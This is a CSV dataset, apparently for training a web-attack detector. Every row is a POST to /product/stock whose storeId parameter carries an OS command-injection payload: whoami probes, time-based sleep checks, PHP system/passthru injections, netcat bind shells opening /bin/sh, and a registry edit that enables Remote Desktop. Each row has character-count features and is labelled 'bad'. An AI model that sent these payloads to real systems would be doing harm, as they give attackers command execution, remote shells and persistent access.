method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo ENACLF$((45+12))$(echo ENACLF)ENACLF//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${popen(print(`echo IWFPXG;echo $((92+70));echo IWFPXG;echo IWFPXG`);IWFPXG,0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 8 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo ELYXQO$((59+10))$(echo ELYXQO)ELYXQO|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSOMAEJD$((8+77))$(echo$IFSOMAEJD)OMAEJD|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 && ipconfig /all,0,1,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo CJDAVC$((37+56))$(echo CJDAVC)CJDAVC",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ZSGSGJ)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSLWOCMM$((20+40))$(echo$IFSLWOCMM)LWOCMM""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSSWOEAI$((89+70))$(echo$IFSSWOEAI)SWOEAI,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo UPRLNQ$((23+4))$(echo UPRLNQ)UPRLNQ""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo DHYUHH); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo AIVPGH) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSXSKAQD$((19+93))$(echo$IFSXSKAQD)XSKAQD',0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo WLJUON$((15+95))$(echo WLJUON)WLJUON\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo DPBAVN)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo IHGKBJ)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSNAFNWQ$((47+44))$(echo$IFSNAFNWQ)NAFNWQ|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSRKAPVH$((51+24))$(echo$IFSRKAPVH)RKAPVH&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ');}print(`echo UXXDJD\necho $((17+17))\necho UXXDJD\necho UXXDJD`);.%252522UXXDJD,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 6 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${system(print(`echo FTPLBI;echo $((56+37));echo FTPLBI;echo FTPLBI`);.%27FTPLBI,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSSIGJRV$((49+39))$(echo$IFSSIGJRV)SIGJRV\\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; sleep 1,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo QQGYPS`.`echo $((10+39))`.`echo QQGYPS`.`echo QQGYPS`);\\QQGYPS,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 ||echo WBGPIV$((75+82))$(echo WBGPIV)WBGPIV&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo UOYNSV$((79+21))$(echo UOYNSV)UOYNSV//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo WTZBYV$((78+41))$(echo WTZBYV)WTZBYV',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 nc -lvvp 4445 -e /bin/sh &,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo UCUISA;echo $((65+31));echo UCUISA;echo UCUISA`);UCUISA",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo MFFGYS;echo $((68+25));echo MFFGYS;echo MFFGYS`);.%22MFFGYS,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${passthru(print(`echo JRXXWA;echo $((92+68));echo JRXXWA;echo JRXXWA`);%5C%5CJRXXWA,0,0,2,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSBVWEHE$((52+69))$(echo$IFSBVWEHE)BVWEHE",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo GFQYZE$((23+31))$(echo GFQYZE)GFQYZE&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo YPQTYX$((9+27))$(echo YPQTYX)YPQTYX&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo GHEHAJ); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSHBSRNA$((99+81))$(echo$IFSHBSRNA)HBSRNA\\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ENIIMV) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 #",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &&echo$IFSCAAYWG$((20+2))$(echo$IFSCAAYWG)CAAYWG""",0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo ZNOLCP$((67+83))$(echo ZNOLCP)ZNOLCP|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo NGVTGX$((65+7))$(echo NGVTGX)NGVTGX'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSOKMGIJ$((46+23))$(echo$IFSOKMGIJ)OKMGIJ\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo HLDNYH); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo FRMTBN) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %27",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSOTLHMR$((33+79))$(echo$IFSOTLHMR)OTLHMR,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'echo ZQODFO$((38+30))$(echo ZQODFO)ZQODFO&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo NCNRPJ$((94+40))$(echo NCNRPJ)NCNRPJ|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo UZYQKP$((76+27))$(echo UZYQKP)UZYQKP',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo ZSRBDN$((11+21))$(echo ZSRBDN)ZSRBDN'",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo DXYHWC$((70+59))$(echo DXYHWC)DXYHWC\\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo SGYETR$((24+19))$(echo SGYETR)SGYETR|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSXKJHCR$((60+67))$(echo$IFSXKJHCR)XKJHCR""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSFQWXOL$((0+18))$(echo$IFSFQWXOL)FQWXOL,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 1 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo HETHMD$((47+99))$(echo HETHMD)HETHMD\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSYPPVOY$((46+66))$(echo$IFSYPPVOY)YPPVOY|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo HWAGVJ
echo $((14+22))
echo HWAGVJ
echo HWAGVJ`);%255C%255CHWAGVJ",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 2 -ne $(echo FATRPK | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo ZRKJES$((88+77))$(echo ZRKJES)ZRKJES",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HKGDXH)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo NUURLG$((10+93))$(echo NUURLG)NUURLG""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 nc -lvvp 4447 -e /bin/sh;,0,0,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo YWVNNT$((69+85))$(echo YWVNNT)YWVNNT""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo OVBFOE$((46+36))$(echo OVBFOE)OVBFOE&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HFODHQ)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo UOMPHD); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 |echo YARTFJ$((41+57))$(echo YARTFJ)YARTFJ""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSQTUCLW$((99+59))$(echo$IFSQTUCLW)QTUCLW',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &echo$IFSAKVCNQ$((27+21))$(echo$IFSAKVCNQ)AKVCNQ""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %5C%5C,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '||echo ETYFQP$((33+58))$(echo ETYFQP)ETYFQP&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 \\,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 5 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSQOVIJM$((98+90))$(echo$IFSQOVIJM)QOVIJM//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo DPZXBY$((14+0))$(echo DPZXBY)DPZXBY&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 && dir C:\Users,0,1,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSFUISVY$((37+75))$(echo$IFSFUISVY)FUISVY\\",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSEQAZRH$((48+41))$(echo$IFSEQAZRH)EQAZRH//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 6 -ne $(echo FATRPK | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 8 -ne $(echo FTWOKG | tr -d '\n' | wc -c) ] || sleep 1 %7C,0,0,1,6,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo EXRBWP$((2+65))$(echo EXRBWP)EXRBWP&",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo XWLOVV$((27+91))$(echo XWLOVV)XWLOVV\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1  echo DRLNDB$((45+12))$(echo DRLNDB)DRLNDB""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo RAKMKS$((5+89))$(echo RAKMKS)RAKMKS',0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 | reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSLUCMYV$((14+43))$(echo$IFSLUCMYV)LUCMYV',0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'print(`echo DUAYMM`.`echo $((77+73))`.`echo DUAYMM`.`echo DUAYMM`);DUAYMM,0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo TNFYTM$((72+96))$(echo TNFYTM)TNFYTM&",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSVMHPMF$((49+68))$(echo$IFSVMHPMF)VMHPMF',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSTGMYGU$((64+59))$(echo$IFSTGMYGU)TGMYGU|",0,0,4,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo GSKKXZ)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo WDCBUT$((15+76))$(echo WDCBUT)WDCBUT|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo XDTLTK) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 \\,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo MATZOK) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %2F%2F,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo RTDEYI$((53+46))$(echo RTDEYI)RTDEYI'",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 exec('pwd'),0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo GOUIRV)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &echo ZPAVCI$((24+53))$(echo ZPAVCI)ZPAVCI//,0,0,2,0,0,0,0,2,bad
